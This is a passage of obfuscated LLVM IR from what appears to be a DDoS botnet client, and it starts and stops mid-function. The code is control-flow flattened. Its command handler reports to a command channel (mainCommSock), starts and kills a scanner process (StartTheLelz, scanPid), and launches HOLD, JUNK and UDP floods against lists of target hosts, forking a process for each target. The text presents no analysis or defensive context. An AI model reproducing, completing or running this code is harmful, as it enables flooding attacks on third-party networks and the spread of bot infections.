  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %34 = load i8**, i8*** %4, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 0
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 @strcmp(i8* %36, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0)) #10
  store i32 %37, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 647588376, i32* %switchVar
  %.reg2mem2 = alloca i32
  %.reg2mem4 = alloca i32
  %.reg2mem6 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 647588376, label %first
    i32 -1357426228, label %40
    i32 1817365862, label %43
    i32 -368542465, label %50
    i32 -1741101294, label %55
    i32 -759525430, label %62
    i32 958779199, label %66
    i32 1897067371, label %69
    i32 -1240326282, label %76
    i32 -1349000043, label %80
    i32 -831703136, label %81
    i32 434830870, label %84
    i32 1764683417, label %91
    i32 -1035344694, label %95
    i32 1133492243, label %96
    i32 -1290424632, label %101
    i32 -1578083750, label %103
    i32 354804307, label %107
    i32 503324281, label %108
    i32 -312747512, label %109
    i32 1061555847, label %110
    i32 -519893112, label %111
    i32 -218106211, label %118
    i32 766310187, label %122
    i32 1107661906, label %129
    i32 1720602852, label %136
    i32 -1058405583, label %137
    i32 -4846173, label %153
    i32 -514556742, label %161
    i32 1129080435, label %165
    i32 1883701279, label %169
    i32 -729215828, label %175
    i32 -987884278, label %177
    i32 -501879594, label %178
    i32 764622219, label %182
    i32 -1806436142, label %183
    i32 -1189138672, label %194
    i32 820811561, label %195
    i32 -278992953, label %202
    i32 1118669425, label %206
    i32 -1883551799, label %213
    i32 1872071451, label %220
    i32 6711020, label %221
    i32 1242548206, label %237
    i32 981031004, label %245
    i32 -791481872, label %249
    i32 1784582738, label %253
    i32 1412483996, label %259
    i32 -285286898, label %261
    i32 1517991583, label %262
    i32 -1187730129, label %266
    i32 1293601876, label %267
    i32 395305912, label %278
    i32 970090177, label %279
    i32 888829548, label %286
    i32 -683918463, label %290
    i32 1713060444, label %297
    i32 720566296, label %304
    i32 1258934493, label %311
    i32 1908768612, label %318
    i32 -697732446, label %325
    i32 1253560681, label %332
    i32 955663679, label %336
    i32 -1622784753, label %343
    i32 -2079660892, label %344
    i32 -724325476, label %367
    i32 1310271998, label %372
    i32 1504538636, label %373
    i32 -1783267273, label %378
    i32 -1163923927, label %385
    i32 1522067712, label %389
    i32 -979956215, label %393
    i32 -187377802, label %402
    i32 1572898726, label %404
    i32 1520497532, label %405
    i32 690887833, label %409
    i32 895355927, label %410
    i32 -764845633, label %424
    i32 -1466179456, label %425
    i32 97801461, label %432
    i32 856613100, label %436
    i32 -1787782989, label %443
    i32 1336388324, label %444
    i32 -1699809848, label %456
    i32 -698470696, label %463
    i32 -1734012489, label %467
    i32 -1177053193, label %471
    i32 -2063464048, label %476
    i32 61881926, label %478
    i32 1436902326, label %479
    i32 361589304, label %483
    i32 -1906043651, label %484
    i32 -1288693446, label %493
    i32 1299602108, label %494
    i32 272524128, label %501
    i32 1455667274, label %505
    i32 -465944982, label %512
    i32 -1193282976, label %519
    i32 426523568, label %526
    i32 1629657231, label %533
    i32 103541763, label %537
    i32 494959690, label %544
    i32 1801376136, label %548
    i32 -1392526295, label %555
    i32 -1223345498, label %556
    i32 1330192380, label %578
    i32 1276226261, label %583
    i32 -1759135373, label %584
    i32 -1154509280, label %588
    i32 -838060420, label %593
    i32 350257168, label %594
    i32 1111184655, label %599
    i32 1861259246, label %606
    i32 968003514, label %610
    i32 1907195227, label %614
    i32 624188406, label %624
    i32 1961461074, label %626
    i32 -1354428880, label %627
    i32 -1903499090, label %631
    i32 -2138324663, label %632
    i32 744828773, label %646
    i32 1410024604, label %647
    i32 804635081, label %654
    i32 1489406816, label %655
    i32 1914768272, label %660
    i32 -15287120, label %667
    i32 1946246611, label %675
    i32 -1712884790, label %683
    i32 1990027260, label %684
    i32 -15192375, label %687
    i32 380874902, label %691
    i32 -1764699692, label %695
    i32 -711342372, label %698
    i32 1424520574, label %699
    i32 1647615528, label %706
    i32 -642386595, label %707
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %38 = icmp ne i32 %.reload, 0
  %39 = select i1 %38, i32 1817365862, i32 -1357426228
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* @mainCommSock, align 4
  %42 = call i32 (i32, i8*, ...) @sockprintf(i32 %41, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.50, i32 0, i32 0))
  store i32 -642386595, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i8**, i8*** %4, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 0
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @strcmp(i8* %46, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.51, i32 0, i32 0)) #10
  %48 = icmp ne i32 %47, 0
  %49 = select i1 %48, i32 -1741101294, i32 -368542465
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i32, i32* @mainCommSock, align 4
  %52 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %53 = call i8* @inet_ntoa(i32 %52) #4
  %54 = call i32 (i32, i8*, ...) @sockprintf(i32 %51, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.52, i32 0, i32 0), i8* %53)
  store i32 -642386595, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i8**, i8*** %4, align 8
  %57 = getelementptr inbounds i8*, i8** %56, i64 0
  %58 = load i8*, i8** %57, align 8
  %59 = call i32 @strcmp(i8* %58, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.53, i32 0, i32 0)) #10
  %60 = icmp ne i32 %59, 0
  %61 = select i1 %60, i32 -519893112, i32 -759525430
  store i32 %61, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %3, align 4
  %64 = icmp ne i32 %63, 2
  %65 = select i1 %64, i32 958779199, i32 1897067371
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* @mainCommSock, align 4
  %68 = call i32 (i32, i8*, ...) @sockprintf(i32 %67, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.54, i32 0, i32 0))
  store i32 -642386595, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i8**, i8*** %4, align 8
  %71 = getelementptr inbounds i8*, i8** %70, i64 1
  %72 = load i8*, i8** %71, align 8
  %73 = call i32 @strcmp(i8* %72, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.55, i32 0, i32 0)) #10
  %74 = icmp ne i32 %73, 0
  %75 = select i1 %74, i32 434830870, i32 -1240326282
  store i32 %75, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = load i32, i32* @scanPid, align 4
  %78 = icmp eq i32 %77, 0
  %79 = select i1 %78, i32 -1349000043, i32 -831703136
  store i32 %79, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  store i32 -642386595, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i32, i32* @scanPid, align 4
  %83 = call i32 @kill(i32 %82, i32 9) #4
  store i32 0, i32* @scanPid, align 4
  store i32 434830870, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8**, i8*** %4, align 8
  %86 = getelementptr inbounds i8*, i8** %85, i64 1
  %87 = load i8*, i8** %86, align 8
  %88 = call i32 @strcmp(i8* %87, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.56, i32 0, i32 0)) #10
  %89 = icmp ne i32 %88, 0
  %90 = select i1 %89, i32 1061555847, i32 1764683417
  store i32 %90, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* @scanPid, align 4
  %93 = icmp ne i32 %92, 0
  %94 = select i1 %93, i32 -1035344694, i32 1133492243
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 -642386595, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = call i32 @fork() #4
  store i32 %97, i32* %5, align 4
  %98 = load i32, i32* %5, align 4
  %99 = icmp ugt i32 %98, 0
  %100 = select i1 %99, i32 -1290424632, i32 -1578083750
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = load i32, i32* %5, align 4
  store i32 %102, i32* @scanPid, align 4
  store i32 -642386595, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i32, i32* %5, align 4
  %105 = icmp eq i32 %104, -1
  %106 = select i1 %105, i32 354804307, i32 503324281
  store i32 %106, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  store i32 -642386595, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  store i32 -312747512, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  call void @StartTheLelz()
  call void @_exit(i32 0) #12
  unreachable

; <label>:110:                                    ; preds = %loopEntry
  store i32 -519893112, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i8**, i8*** %4, align 8
  %113 = getelementptr inbounds i8*, i8** %112, i64 0
  %114 = load i8*, i8** %113, align 8
  %115 = call i32 @strcmp(i8* %114, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0)) #10
  %116 = icmp ne i32 %115, 0
  %117 = select i1 %116, i32 820811561, i32 -218106211
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i32, i32* %3, align 4
  %120 = icmp slt i32 %119, 4
  %121 = select i1 %120, i32 1720602852, i32 766310187
  store i32 %121, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  %123 = load i8**, i8*** %4, align 8
  %124 = getelementptr inbounds i8*, i8** %123, i64 2
  %125 = load i8*, i8** %124, align 8
  %126 = call i32 @atoi(i8* %125) #10
  %127 = icmp slt i32 %126, 1
  %128 = select i1 %127, i32 1720602852, i32 1107661906
  store i32 %128, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i8**, i8*** %4, align 8
  %131 = getelementptr inbounds i8*, i8** %130, i64 3
  %132 = load i8*, i8** %131, align 8
  %133 = call i32 @atoi(i8* %132) #10
  %134 = icmp slt i32 %133, 1
  %135 = select i1 %134, i32 1720602852, i32 -1058405583
  store i32 %135, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  store i32 -642386595, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  %138 = load i8**, i8*** %4, align 8
  %139 = getelementptr inbounds i8*, i8** %138, i64 1
  %140 = load i8*, i8** %139, align 8
  store i8* %140, i8** %6, align 8
  %141 = load i8**, i8*** %4, align 8
  %142 = getelementptr inbounds i8*, i8** %141, i64 2
  %143 = load i8*, i8** %142, align 8
  %144 = call i32 @atoi(i8* %143) #10
  store i32 %144, i32* %7, align 4
  %145 = load i8**, i8*** %4, align 8
  %146 = getelementptr inbounds i8*, i8** %145, i64 3
  %147 = load i8*, i8** %146, align 8
  %148 = call i32 @atoi(i8* %147) #10
  store i32 %148, i32* %8, align 4
  %149 = load i8*, i8** %6, align 8
  %150 = call i8* @strstr(i8* %149, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #10
  %151 = icmp ne i8* %150, null
  %152 = select i1 %151, i32 -4846173, i32 -501879594
  store i32 %152, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  %154 = load i32, i32* @mainCommSock, align 4
  %155 = load i8*, i8** %6, align 8
  %156 = load i32, i32* %7, align 4
  %157 = load i32, i32* %8, align 4
  %158 = call i32 (i32, i8*, ...) @sockprintf(i32 %154, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.58, i32 0, i32 0), i8* %155, i32 %156, i32 %157)
  %159 = load i8*, i8** %6, align 8
  %160 = call i8* @strtok(i8* %159, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %160, i8** %9, align 8
  store i32 -514556742, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = load i8*, i8** %9, align 8
  %163 = icmp ne i8* %162, null
  %164 = select i1 %163, i32 1129080435, i32 -987884278
  store i32 %164, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  %166 = call i32 @listFork()
  %167 = icmp ne i32 %166, 0
  %168 = select i1 %167, i32 -729215828, i32 1883701279
  store i32 %168, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i8*, i8** %9, align 8
  %171 = load i32, i32* %7, align 4
  %172 = load i32, i32* %8, align 4
  call void @sendHOLD(i8* %170, i32 %171, i32 %172)
  %173 = load i32, i32* @mainCommSock, align 4
  %174 = call i32 @close(i32 %173)
  call void @_exit(i32 0) #12
  unreachable

; <label>:175:                                    ; preds = %loopEntry
  %176 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %176, i8** %9, align 8
  store i32 -514556742, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  store i32 -1189138672, i32* %switchVar
  br label %loopEnd

; <label>:178:                                    ; preds = %loopEntry
  %179 = call i32 @listFork()
  %180 = icmp ne i32 %179, 0
  %181 = select i1 %180, i32 764622219, i32 -1806436142
  store i32 %181, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  store i32 -642386595, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %184 = load i32, i32* @mainCommSock, align 4
  %185 = load i8*, i8** %6, align 8
  %186 = load i32, i32* %7, align 4
  %187 = load i32, i32* %8, align 4
  %188 = call i32 (i32, i8*, ...) @sockprintf(i32 %184, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.58, i32 0, i32 0), i8* %185, i32 %186, i32 %187)
  %189 = load i8*, i8** %6, align 8
  %190 = load i32, i32* %7, align 4
  %191 = load i32, i32* %8, align 4
  call void @sendHOLD(i8* %189, i32 %190, i32 %191)
  %192 = load i32, i32* @mainCommSock, align 4
  %193 = call i32 @close(i32 %192)
  call void @_exit(i32 0) #12
  unreachable

; <label>:194:                                    ; preds = %loopEntry
  store i32 820811561, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i8**, i8*** %4, align 8
  %197 = getelementptr inbounds i8*, i8** %196, i64 0
  %198 = load i8*, i8** %197, align 8
  %199 = call i32 @strcmp(i8* %198, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i32 0, i32 0)) #10
  %200 = icmp ne i32 %199, 0
  %201 = select i1 %200, i32 970090177, i32 -278992953
  store i32 %201, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %203 = load i32, i32* %3, align 4
  %204 = icmp slt i32 %203, 4
  %205 = select i1 %204, i32 1872071451, i32 1118669425
  store i32 %205, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  %207 = load i8**, i8*** %4, align 8
  %208 = getelementptr inbounds i8*, i8** %207, i64 2
  %209 = load i8*, i8** %208, align 8
  %210 = call i32 @atoi(i8* %209) #10
  %211 = icmp slt i32 %210, 1
  %212 = select i1 %211, i32 1872071451, i32 -1883551799
  store i32 %212, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %214 = load i8**, i8*** %4, align 8
  %215 = getelementptr inbounds i8*, i8** %214, i64 3
  %216 = load i8*, i8** %215, align 8
  %217 = call i32 @atoi(i8* %216) #10
  %218 = icmp slt i32 %217, 1
  %219 = select i1 %218, i32 1872071451, i32 6711020
  store i32 %219, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  store i32 -642386595, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = load i8**, i8*** %4, align 8
  %223 = getelementptr inbounds i8*, i8** %222, i64 1
  %224 = load i8*, i8** %223, align 8
  store i8* %224, i8** %10, align 8
  %225 = load i8**, i8*** %4, align 8
  %226 = getelementptr inbounds i8*, i8** %225, i64 2
  %227 = load i8*, i8** %226, align 8
  %228 = call i32 @atoi(i8* %227) #10
  store i32 %228, i32* %11, align 4
  %229 = load i8**, i8*** %4, align 8
  %230 = getelementptr inbounds i8*, i8** %229, i64 3
  %231 = load i8*, i8** %230, align 8
  %232 = call i32 @atoi(i8* %231) #10
  store i32 %232, i32* %12, align 4
  %233 = load i8*, i8** %10, align 8
  %234 = call i8* @strstr(i8* %233, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #10
  %235 = icmp ne i8* %234, null
  %236 = select i1 %235, i32 1242548206, i32 1517991583
  store i32 %236, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = load i32, i32* @mainCommSock, align 4
  %239 = load i8*, i8** %10, align 8
  %240 = load i32, i32* %11, align 4
  %241 = load i32, i32* %12, align 4
  %242 = call i32 (i32, i8*, ...) @sockprintf(i32 %238, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.60, i32 0, i32 0), i8* %239, i32 %240, i32 %241)
  %243 = load i8*, i8** %10, align 8
  %244 = call i8* @strtok(i8* %243, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %244, i8** %13, align 8
  store i32 981031004, i32* %switchVar
  br label %loopEnd

; <label>:245:                                    ; preds = %loopEntry
  %246 = load i8*, i8** %13, align 8
  %247 = icmp ne i8* %246, null
  %248 = select i1 %247, i32 -791481872, i32 -285286898
  store i32 %248, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = call i32 @listFork()
  %251 = icmp ne i32 %250, 0
  %252 = select i1 %251, i32 1412483996, i32 1784582738
  store i32 %252, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  %254 = load i8*, i8** %13, align 8
  %255 = load i32, i32* %11, align 4
  %256 = load i32, i32* %12, align 4
  call void @sendJUNK(i8* %254, i32 %255, i32 %256)
  %257 = load i32, i32* @mainCommSock, align 4
  %258 = call i32 @close(i32 %257)
  call void @_exit(i32 0) #12
  unreachable

; <label>:259:                                    ; preds = %loopEntry
  %260 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %260, i8** %13, align 8
  store i32 981031004, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  store i32 395305912, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %263 = call i32 @listFork()
  %264 = icmp ne i32 %263, 0
  %265 = select i1 %264, i32 -1187730129, i32 1293601876
  store i32 %265, i32* %switchVar
  br label %loopEnd

; <label>:266:                                    ; preds = %loopEntry
  store i32 -642386595, i32* %switchVar
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  %268 = load i32, i32* @mainCommSock, align 4
  %269 = load i8*, i8** %10, align 8
  %270 = load i32, i32* %11, align 4
  %271 = load i32, i32* %12, align 4
  %272 = call i32 (i32, i8*, ...) @sockprintf(i32 %268, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.60, i32 0, i32 0), i8* %269, i32 %270, i32 %271)
  %273 = load i8*, i8** %10, align 8
  %274 = load i32, i32* %11, align 4
  %275 = load i32, i32* %12, align 4
  call void @sendJUNK(i8* %273, i32 %274, i32 %275)
  %276 = load i32, i32* @mainCommSock, align 4
  %277 = call i32 @close(i32 %276)
  call void @_exit(i32 0) #12
  unreachable

; <label>:278:                                    ; preds = %loopEntry
  store i32 970090177, i32* %switchVar
  br label %loopEnd

; <label>:279:                                    ; preds = %loopEntry
  %280 = load i8**, i8*** %4, align 8
  %281 = getelementptr inbounds i8*, i8** %280, i64 0
  %282 = load i8*, i8** %281, align 8
  %283 = call i32 @strcmp(i8* %282, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.61, i32 0, i32 0)) #10
  %284 = icmp ne i32 %283, 0
  %285 = select i1 %284, i32 -1466179456, i32 888829548
  store i32 %285, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  %287 = load i32, i32* %3, align 4
  %288 = icmp slt i32 %287, 6
  %289 = select i1 %288, i32 -1622784753, i32 -683918463
  store i32 %289, i32* %switchVar
  br label %loopEnd

; <label>:290:                                    ; preds = %loopEntry
  %291 = load i8**, i8*** %4, align 8
  %292 = getelementptr inbounds i8*, i8** %291, i64 3
  %293 = load i8*, i8** %292, align 8
  %294 = call i32 @atoi(i8* %293) #10
  %295 = icmp eq i32 %294, -1
  %296 = select i1 %295, i32 -1622784753, i32 1713060444
  store i32 %296, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  %298 = load i8**, i8*** %4, align 8
  %299 = getelementptr inbounds i8*, i8** %298, i64 2
  %300 = load i8*, i8** %299, align 8
  %301 = call i32 @atoi(i8* %300) #10
  %302 = icmp eq i32 %301, -1
  %303 = select i1 %302, i32 -1622784753, i32 720566296
  store i32 %303, i32* %switchVar
  br label %loopEnd

; <label>:304:                                    ; preds = %loopEntry
  %305 = load i8**, i8*** %4, align 8
  %306 = getelementptr inbounds i8*, i8** %305, i64 4
  %307 = load i8*, i8** %306, align 8
  %308 = call i32 @atoi(i8* %307) #10
  %309 = icmp eq i32 %308, -1
  %310 = select i1 %309, i32 -1622784753, i32 1258934493
  store i32 %310, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  %312 = load i8**, i8*** %4, align 8
  %313 = getelementptr inbounds i8*, i8** %312, i64 5
  %314 = load i8*, i8** %313, align 8
  %315 = call i32 @atoi(i8* %314) #10
  %316 = icmp eq i32 %315, -1
  %317 = select i1 %316, i32 -1622784753, i32 1908768612
  store i32 %317, i32* %switchVar
  br label %loopEnd

; <label>:318:                                    ; preds = %loopEntry
  %319 = load i8**, i8*** %4, align 8
  %320 = getelementptr inbounds i8*, i8** %319, i64 5
  %321 = load i8*, i8** %320, align 8
  %322 = call i32 @atoi(i8* %321) #10
  %323 = icmp sgt i32 %322, 65500
  %324 = select i1 %323, i32 -1622784753, i32 -697732446
  store i32 %324, i32* %switchVar
  br label %loopEnd

; <label>:325:                                    ; preds = %loopEntry
  %326 = load i8**, i8*** %4, align 8
  %327 = getelementptr inbounds i8*, i8** %326, i64 4
  %328 = load i8*, i8** %327, align 8
  %329 = call i32 @atoi(i8* %328) #10
  %330 = icmp sgt i32 %329, 32
  %331 = select i1 %330, i32 -1622784753, i32 1253560681
  store i32 %331, i32* %switchVar
  br label %loopEnd

; <label>:332:                                    ; preds = %loopEntry
  %333 = load i32, i32* %3, align 4
  %334 = icmp eq i32 %333, 7
  %335 = select i1 %334, i32 955663679, i32 -2079660892
  store i32 %335, i32* %switchVar
  br label %loopEnd

; <label>:336:                                    ; preds = %loopEntry
  %337 = load i8**, i8*** %4, align 8
  %338 = getelementptr inbounds i8*, i8** %337, i64 6
  %339 = load i8*, i8** %338, align 8
  %340 = call i32 @atoi(i8* %339) #10
  %341 = icmp slt i32 %340, 1
  %342 = select i1 %341, i32 -1622784753, i32 -2079660892
  store i32 %342, i32* %switchVar
  br label %loopEnd

; <label>:343:                                    ; preds = %loopEntry
  store i32 -642386595, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  %345 = load i8**, i8*** %4, align 8
  %346 = getelementptr inbounds i8*, i8** %345, i64 1
  %347 = load i8*, i8** %346, align 8
  store i8* %347, i8** %14, align 8
  %348 = load i8**, i8*** %4, align 8
  %349 = getelementptr inbounds i8*, i8** %348, i64 2
  %350 = load i8*, i8** %349, align 8
  %351 = call i32 @atoi(i8* %350) #10
  store i32 %351, i32* %15, align 4
  %352 = load i8**, i8*** %4, align 8
  %353 = getelementptr inbounds i8*, i8** %352, i64 3
  %354 = load i8*, i8** %353, align 8
  %355 = call i32 @atoi(i8* %354) #10
  store i32 %355, i32* %16, align 4
  %356 = load i8**, i8*** %4, align 8
  %357 = getelementptr inbounds i8*, i8** %356, i64 4
  %358 = load i8*, i8** %357, align 8
  %359 = call i32 @atoi(i8* %358) #10
  store i32 %359, i32* %17, align 4
  %360 = load i8**, i8*** %4, align 8
  %361 = getelementptr inbounds i8*, i8** %360, i64 5
  %362 = load i8*, i8** %361, align 8
  %363 = call i32 @atoi(i8* %362) #10
  store i32 %363, i32* %18, align 4
  %364 = load i32, i32* %3, align 4
  %365 = icmp eq i32 %364, 7
  %366 = select i1 %365, i32 -724325476, i32 1310271998
  store i32 %366, i32* %switchVar
  br label %loopEnd

; <label>:367:                                    ; preds = %loopEntry
  %368 = load i8**, i8*** %4, align 8
  %369 = getelementptr inbounds i8*, i8** %368, i64 6
  %370 = load i8*, i8** %369, align 8
  %371 = call i32 @atoi(i8* %370) #10
  store i32 1504538636, i32* %switchVar
  store i32 %371, i32* %.reg2mem2
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  store i32 1504538636, i32* %switchVar
  store i32 10, i32* %.reg2mem2
  br label %loopEnd

; <label>:373:                                    ; preds = %loopEntry
  %.reload3 = load i32, i32* %.reg2mem2
  store i32 %.reload3, i32* %19, align 4
  %374 = load i8*, i8** %14, align 8
  %375 = call i8* @strstr(i8* %374, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #10
  %376 = icmp ne i8* %375, null
  %377 = select i1 %376, i32 -1783267273, i32 1520497532
  store i32 %377, i32* %switchVar
  br label %loopEnd

; <label>:378:                                    ; preds = %loopEntry
  %379 = load i32, i32* @mainCommSock, align 4
  %380 = load i8*, i8** %14, align 8
  %381 = load i32, i32* %16, align 4
  %382 = call i32 (i32, i8*, ...) @sockprintf(i32 %379, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.62, i32 0, i32 0), i8* %380, i32 %381)
  %383 = load i8*, i8** %14, align 8
  %384 = call i8* @strtok(i8* %383, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %384, i8** %20, align 8
  store i32 -1163923927, i32* %switchVar
  br label %loopEnd

; <label>:385:                                    ; preds = %loopEntry
  %386 = load i8*, i8** %20, align 8
  %387 = icmp ne i8* %386, null
  %388 = select i1 %387, i32 1522067712, i32 1572898726
  store i32 %388, i32* %switchVar
  br label %loopEnd

; <label>:389:                                    ; preds = %loopEntry
  %390 = call i32 @listFork()
  %391 = icmp ne i32 %390, 0
  %392 = select i1 %391, i32 -187377802, i32 -979956215
  store i32 %392, i32* %switchVar
  br label %loopEnd

; <label>:393:                                    ; preds = %loopEntry
  %394 = load i8*, i8** %20, align 8
  %395 = load i32, i32* %15, align 4
  %396 = load i32, i32* %16, align 4
  %397 = load i32, i32* %17, align 4
  %398 = load i32, i32* %18, align 4
  %399 = load i32, i32* %19, align 4
  call void @sendUDP(i8* %394, i32 %395, i32 %396, i32 %397, i32 %398, i32 %399)
  %400 = load i32, i32* @mainCommSock, align 4
  %401 = call i32 @close(i32 %400)
  call void @_exit(i32 0) #12
  unreachable

; <label>:402:                                    ; preds = %loopEntry
  %403 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %403, i8** %20, align 8
  store i32 -1163923927, i32* %switchVar
  br label %loopEnd

; <label>:404:                                    ; preds = %loopEntry
  store i32 -764845633, i32* %switchVar
  br label %loopEnd

; <label>:405:                                    ; preds = %loopEntry
  %406 = call i32 @listFork()
  %407 = icmp ne i32 %406, 0
  %408 = select i1 %407, i32 690887833, i32 895355927
  store i32 %408, i32* %switchVar
  br label %loopEnd

; <label>:409:                                    ; preds = %loopEntry
  store i32 -642386595, i32* %switchVar
  br label %loopEnd

; <label>:410:                                    ; preds = %loopEntry
  %411 = load i32, i32* @mainCommSock, align 4
  %412 = load i8*, i8** %14, align 8
  %413 = load i32, i32* %15, align 4
  %414 = load i32, i32* %16, align 4
